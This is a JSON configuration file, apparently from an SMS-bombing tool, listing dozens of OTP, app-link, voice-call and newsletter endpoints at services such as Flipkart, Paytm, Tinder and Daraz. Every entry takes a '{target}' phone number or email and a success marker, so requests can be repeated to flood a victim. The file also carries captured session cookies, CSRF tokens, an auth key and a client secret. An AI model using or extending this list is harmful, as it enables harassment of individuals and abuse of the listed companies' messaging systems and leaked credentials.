{
    "contributors": [
        "TheSpeedX",
        "Avinash",
        "Reiltar",
        "ItzAnasov"
    ],
    "version": "2.3.5",
    "sms": {

        "218": [
            {
                "name": "3Via",
                "method": "POST",
                "url": "https://3via.ly/api/client/login",
                "data": {
                    "msisdn": "{target}",
                    "device_type": "web"
                },
                "identifier": "Otp Sent successfully"
            },
            {
                "name": "Winmore",
                "method": "POST",
                "url": "https://winmore.ly/api/p10/public/get_started",
                "data": {
                    "phone": "{target}",
                    "countryCode": "ly",
                    "language": "en",
                    "utm": {}
                },
                "identifier": "SUBSCRIBED"
            },
            {
                "name": "Lingo",
                "method": "POST",
                "url": "https://lingo.ly/api/client/login",
                "data": {
                    "msisdn": "{target}"
                },
                "identifier": "OTP Sended successfully"
            },
            {
                "name": "Bekam",
                "method": "POST",
                "url": "https://bekam.ly/api/client/login",
                "data": {
                    "msisdn": "{target}"
                },
                "identifier": "OTP Send Successfully"
            }
        ],

        "977":[
            {
                "name":"Daraz Nepal",
                "method":"POST",
                "url":"https://member.daraz.com.np/user/api/sendVerificationSms",
                "data":{
                    "phone":"{target}",
                    "type":"OTP_REGISTER",
                    "lzdAppVersion":"1.0",
                    "X-CSRF-TOKEN":"57343b8557abe",
                    "ncToken":{
                        "csessionid":"01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
                        "sig":"05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
                        "token":"QPXW:1638536554908:0.22529358478093664"
           
                    }

                },
                "headers":{
                    "X-CSRF-TOKEN":"57343b8557abe",
                    "X-Requested-With":"XMLHttpRequest",
                    "Origin":"https://member.daraz.com.np",
                    "Referer":"https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
                    "Cookie":"client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33"
                
                },
                 "identifier":"\"notSuccess\":false"

            },
            {
                "name":"Clamphook",
                "method":"POST",
                "url":"https://backend.clamphook.com//auth/register",
                "json":{
                    "mobile":"{cc}-{target}"
                },
                "headers":{
                    "Host":"backend.clamphook.com",
                    "Origin":"https://clamphook.com",
                    "Referer":"https://clamphook.com/",
                    "Sec-Fetch-Mode":"cors"
                },
                "identifier":"\"success\":true"
                
            }
    
        ],

        "91": [
            {
                "name": "confirmtkt",
                "method": "GET",
                "url": "https://securedapi.confirmtkt.com/api/platform/register",
                "params": {
                    "newOtp": "true",
                    "mobileNumber": "{target}"
                },
                "identifier": "false"
            },
            {
                "name": "justdial",
                "method": "GET",
                "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
                "params": {
                    "mobile": "{target}"
                },
                "identifier": "sent"
            },
            {
                "name": "allensolly",
                "method": "POST",
                "url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
                "data": {
                    "mobileoremail": "{target}",
                    "name": "markluther"
                },
               "identifier": "true"
            },
            {
                "name": "frotels",
                "method": "POST",
                "url": "https://www.frotels.com/appsendsms.php",
                "data": {
                    "mobno": "{target}"
                },
                "identifier": "sent"
            },
            {
                "name": "gapoon",
                "method": "POST",
                "url": "https://www.gapoon.com/userSignup",
                "data": {
                    "mobile": "{target}",
                    "email": "noreply@gmail.com",
                    "name": "LexLuthor"
                },
                "identifier": "1"
            },
            {
                "name": "housing",
                "method": "POST",
                "url": "https://login.housing.com/api/v2/send-otp",
                "data": {
                    "phone": "{target}"
                },
                "identifier": "Sent"
            },
            {
                "name": "porter",
                "method": "POST",
                "url": "https://porter.in/restservice/send_app_link_sms",
                "data": {
                    "phone": "{target}",
                    "referrer_string": "",
                    "brand": "porter"
                },
                "identifier": "true"
            },
            {
                "name": "cityflo",
                "method": "POST",
                "url": "https://cityflo.com/website-app-download-link-sms/",
                "data": {
                    "mobile_number": "{target}"
                },
                "identifier": "sent"
            },
            {
                "name": "nnnow",
                "method": "POST",
                "url": "https://api.nnnow.com/d/api/appDownloadLink",
                "data": {
                    "mobileNumber": "{target}"
                },
                "identifier": "true"
            },
            {
                "name": "ajio",
                "method": "POST",
                "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
                "data": {
                    "firstName": "xxps",
                    "login": "wiqpdl223@wqew.com",
                    "password": "QASpw@1s",
                    "genderType": "Male",
                    "mobileNumber": "{target}",
                    "requestType": "SENDOTP"
                },
                "identifier": "1"
            },
            {
                "name": "happyeasygo",
                "method": "GET",
                "url": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do",
                "params": {
                    "phone": "91%20{target}"
                },
                "identifier": "true"
            },
            {
                "name": "unacademy",
                "method": "POST",
                "url": "https://unacademy.com/api/v1/user/get_app_link/",
                "data": {
                    "phone": "{target}"
                },
                "identifier": "sent"
            },
            {
                "name": "treebo",
                "method": "POST",
                "url": "https://www.treebo.com/api/v2/auth/login/otp/",
                "data": {
                    "phone_number": "{target}"
                },
                "identifier": "sent"
            },
            {
                "name": "airtel",
                "method": "GET",
                "url": "https://www.airtel.in/referral-api/core/notify",
                "params": {
                    "messageId": "map",
                    "rtn": "{target}"
                },
                "identifier": "Success"
            },
            {
                "name": "pharmeasy",
                "method": "POST",
                "url": "https://pharmeasy.in/api/auth/requestOTP",
                "json": {
                    "contactNumber": "{target}"
                },
                "identifier": "resendSmsCounter"
            },
            {
                "name": "mylescars",
                "method": "POST",
                "url": "https://www.mylescars.com/usermanagements/chkContact",
                "data": {
                    "contactNo": "{target}"
                },
                "identifier": "success@::::"
            },
            {
                "name": "grofers",
                "method": "POST",
                "url": "https://grofers.com/v2/accounts/",
                "data": {
                    "user_phone": "{target}"
                },
                "headers": {
                    "auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"
                },
                "identifier": "We have sent"
            },
            {
                "name": "dream11",
                "method": "POST",
                "url": "https://api.dream11.com/sendsmslink",
                "data": {
                    "siteId": "1",
                    "mobileNum": "{target}",
                    "appType": "androidfull"
                },
                "identifier": "true"
            },
            {
                "name": "cashify",
                "method": "GET",
                "url": "https://www.cashify.in/api/cu01/v1/app-link",
                "params": {
                    "mn": "{target}"
                },
                "identifier": "Successfully"
            },
            {
                "name": "paytm",
                "method": "POST",
                "url": "https://commonfront.paytm.com/v4/api/sendsms",
                "data": {
                    "phone": "{target}",
                    "guid": "2952fa812660c58dc160ca6c9894221d"
                },
                "identifier": "202"
            },
            {
                "name": "kfc-in",
                "method": "POST",
                "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin",
                "headers": {
                    "Referer": "https://online.kfc.co.in/login",
                    "__RequestVerificationToken": "-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01"
                },
                "json": {
                    "AuthorizedFor": "3",
                    "phoneNumber": "{target}",
                    "Resend": "false"
                },
                "identifier": "true"
            },
            {
                "name": "indialends",
                "method": "POST",
                "url": "https://indialends.com/internal/a/mobile-verification_v2.ashx",
                "cookies": {
                    "_ga": "GA1.2.1483885314.1559157646",
                    "_fbp": "fb.1.1559157647161.1989205138",
                    "TiPMix": "91.9909185226964",
                    "gcb_t_track": "SEO - Google",
                    "gcb_t_keyword": "",
                    "gcb_t_l_url": "https://www.google.com/",
                    "gcb_utm_medium": "",
                    "gcb_utm_campaign": "",
                    "ASP.NET_SessionId": "ioqkek5lbgvldlq4i3cmijcs",
                    "web_app_landing_utm_source": "",
                    "web_app_landing_url": "/personal-loan",
                    "webapp_landing_referral_url": "https://www.google.com/",
                    "ARRAffinity": "747e0c2664f5cb6179583963d834f4899eee9f6c8dcc773fc05ce45fa06b2417",
                    "_gid": "GA1.2.969623705.1560660444",
                    "_gat": "1",
                    "current_url": "https://indialends.com/personal-loan",
                    "cookies_plbt": "0"
                },
                "headers": {
                    "Referer": "https://indialends.com/personal-loan"
                },
                "data": {
                    "aeyder03teaeare": "1",
                    "ertysvfj74sje": "{cc}",
                    "jfsdfu14hkgertd": "{target}",
                    "lj80gertdfg": "0"
                },
                "identifier": "1"
            }
        ],
        "multi": [
            {
                "name": "flipkart",
                "method": "POST",
                "cc_target": "loginId",
                "url": "https://www.flipkart.com/api/5/user/otp/generate",
                "data": {
                    "loginId": "+{target}"
                },
                "headers": {
                    "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                    "Origin": "https://www.flipkart.com",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "identifier": "emailMask"
            },
            {
                "name": "qlean",
                "method": "POST",
                "url": "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
                "data": {
                    "phone": "{cc}{target}"
                },
                "identifier": "request_id"
            },
            {
                "name": "mailru",
                "method": "POST",
                "url": "https://cloud.mail.ru//api/v2/notify/applink",
                "data": {
                    "phone": "+{cc}{target}",
                    "api": "2",
                    "email": "email",
                    "x-email": "x-email"
                },
                "identifier": "200"
            },
            {
                "name": "tinder",
                "method": "POST",
                "url": "https://api.gotinder.com/v2/auth/sms/send",
                "params": {
                    "auth_type": "sms",
                    "locale": "ru"
                },
                "data": {
                    "phone_number": "{cc}{target}"
                },
                "identifier": "200"
            },
            {
                "name": "youla",
                "method": "POST",
                "url": "https://youla.ru/web-api/auth/request_code",
                "data": {
                    "phone": "+{cc}{target}"
                },
                "identifier": ":6"
            },
            {
                "name": "ivi",
                "method": "POST",
                "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6",
                "data": {
                    "phone": "{cc}{target}"
                },
                "identifier": "true"
            },
            {
                "name": "delitime",
                "method": "POST",
                "url": "https://api.delitime.ru/api/v2/signup",
                "data": {
                    "SignupForm[username]": "{cc}{target}",
                    "SignupForm[device_type]": "3"
                },
                "identifier": "true"
            },
            {
                "name": "icq",
                "method": "POST",
                "url": "https://www.icq.com/smsreg/requestPhoneValidation.php",
                "data": {
                    "msisdn": "{cc}{target}",
                    "locale": "en",
                    "k": "ic1rtwz1s1Hj1O0r",
                    "r": "45559"
                },
                "identifier": "200"
            },
            {
                "name": "ivitv",
                "method": "POST",
                "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6/",
                "data": {
                    "phone": "{cc}{target}",
                    "device": "Windows+v.43+Chrome+v.7453451",
                    "app_version": "870"
                },
                "identifier": "true"
            },
            {
                "name": "indialends",
                "method": "POST",
                "url": "https://indialends.com/internal/a/mobile-verification_v2.ashx",
                "cookies": {
                    "_ga": "GA1.2.1483885314.1559157646",
                    "_fbp": "fb.1.1559157647161.1989205138",
                    "TiPMix": "91.9909185226964",
                    "gcb_t_track": "SEO - Google",
                    "gcb_t_keyword": "",
                    "gcb_t_l_url": "https://www.google.com/",
                    "gcb_utm_medium": "",
                    "gcb_utm_campaign": "",
                    "ASP.NET_SessionId": "ioqkek5lbgvldlq4i3cmijcs",
                    "web_app_landing_utm_source": "",
                    "web_app_landing_url": "/personal-loan",
                    "webapp_landing_referral_url": "https://www.google.com/",
                    "ARRAffinity": "747e0c2664f5cb6179583963d834f4899eee9f6c8dcc773fc05ce45fa06b2417",
                    "_gid": "GA1.2.969623705.1560660444",
                    "_gat": "1",
                    "current_url": "https://indialends.com/personal-loan",
                    "cookies_plbt": "0"
                },
                "headers": {
                    "Referer": "https://indialends.com/personal-loan"
                },
                "data": {
                    "aeyder03teaeare": "1",
                    "ertysvfj74sje": "{cc}",
                    "jfsdfu14hkgertd": "{target}",
                    "lj80gertdfg": "0"
                },
                "identifier": "1"
            },
            {
                "name": "redbus",
                "method": "GET",
                "url": "https://m.redbus.in/api/getOtp",
                "params": {
                    "number": "{target}",
                    "cc": "{cc}",
                    "whatsAppOpted": false
                },
                "identifier": "200"
            },
            {
                "name": "newtonschools",
                "method": "POST",
                "url": "https://my.newtonschool.co:443/api/v1/user/otp/",
                "params": {
                    "registration": true
                },
                "data": {
                    "phone": "+{cc}{target}"
                },
                "identifier": "S003"
            },
            {
                "name": "qiwi",
                "method": "POST",
                "url": "https://mobile-api.qiwi.com/oauth/authorize",
                "data": {
                    "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
                    "username": "{cc}{target}",
                    "client_id": "android-qw",
                    "client_secret": "zAm4FKq9UnSe7id"
                },
                "identifier": "confirmation_id"
            }
        ]
    },
    "call": {
        "91": [
            {
                "name": "makaan",
                "method": "GET",
                "url": "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/{target}",
                "params": {
                    "callType": "otpOnCall"
                },
                "identifier": "2XX"
            },
            {
                "name": "realestate",
                "method": "POST",
                "url": "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php",
                "headers": {
                    "x-requested-with": "XMLHttpRequest",
                    "referer": "https://www.realestateindia.com/thanks.php?newreg"
                },
                "cookies": {
                    "visitedToken": "176961560836367"
                },
                "params": {
                    "sid": "0.5983221395805354"
                },
                "data": {
                    "action_id": "call_to_otp",
                    "mob_num": "{target}",
                    "member_id": "1547045"
                },
                "identifier": "Y"
            },
            {
                "name": "magicbricks",
                "method": "GET",
                "url": "https://api.magicbricks.com/bricks/verifyOnCall.html",
                "params": {
                    "mobile": "{target}"
                },
                "identifier": "callmade"
            },
            {
                "name": "career360",
                "method": "POST",
                "url": "https://www.careers360.com/ajax/no-cache/user/otp-send",
                "cookies": {
                    "_gcl_au": "1.1.1168325424.1600579108",
                    "WZRK_G": "4584ba1e8345400d92392a88464c9183",
                    "__asc": "ce35392c174a9f2fbe2f2c29a0c",
                    "__auc": "ce35392c174a9f2fbe2f2c29a0c",
                    "_ga": "GA1.2.1646044729.1600579108",
                    "_gid": "GA1.2.365026440.1600579108",
                    "_fbp": "fb.1.1600579107930.1446075664",
                    "dataLayer_": "Home Pages",
                    "csrftoken": "RI5TGK7tuZdkJjVNzu3lRdSeRcztdtYqfsLmngbNRK1lMH7Uir1qFprpSgCI2ZNy",
                    "_omappvp": "RIeaJ0pgkcvqwRygRT8VTxJ6PrpnRvze6xwTpZBXztsuBXhgRV5OIU97g9s0DivdxwVAHM0DF1teulefRfsK0wCo2MRjp325",
                    "G_ENABLED_IDPS": "google",
                    "_dc_gtm_UA-46098128-1": "1",
                    "_omappvs": "1600579353765",
                    "WZRK_S_654-ZZ4-5Z5Z": "%7B%22p%22%3A5%2C%22s%22%3A1600579103%2C%22t%22%3A1600579356%7D"
                },
                "headers": {
                    "X-CSRFToken": "9tKY96jb358WKiZBMwhz2EcranwljWDbxdqrQCnvqQWXNGbIvtfEQQLCbrzA8ssj",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin": "https://www.careers360.com",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                    "Referer": "https://www.careers360.com/user/otp-verify/101e8d6e591af6688f640eee08f5a5f8?destination=&click_location=header&google_success=header"
                },
                "data": {
                    "mobile_number": "{target}",
                    "method": "call",
                    "uid": "12692588"
                },
                "identifier": "success"
            }
        ],
        "multi": []
    },
    "mail": {
        "multi": [
            {
                "name": "themezee",
                "method": "POST",
                "url": "https://themezee.com/wp-admin/admin-ajax.php?action=mc4wp-form",
                "data": {
                    "EMAIL": "{target}",
                    "AGREE": "1",
                    "_mc4wp_honeypot": "",
                    "_mc4wp_timestamp": "1614865641",
                    "_mc4wp_form_id": "184963",
                    "_mc4wp_form_element_id": "mc4wp-form-1"
                },
                "identifier": "mc4wp-success"
            },
            {
                "name": "credible_init",
                "method": "POST",
                "url": "https://mycredible.info:443/mycredible/signup",
                "data": {
                    "email": "{target}",
                    "first_name": "Lex",
                    "last_name": "Luthor"
                },
                "identifier": "ccuid"
            },
            {
                "name": "credible_mail",
                "method": "GET",
                "url": "https://mycredible.info:443/mycredible/signin/request_otp",
                "params": {
                    "email": "{target}"
                },
                "identifier": ""
            }
        ]
    }
}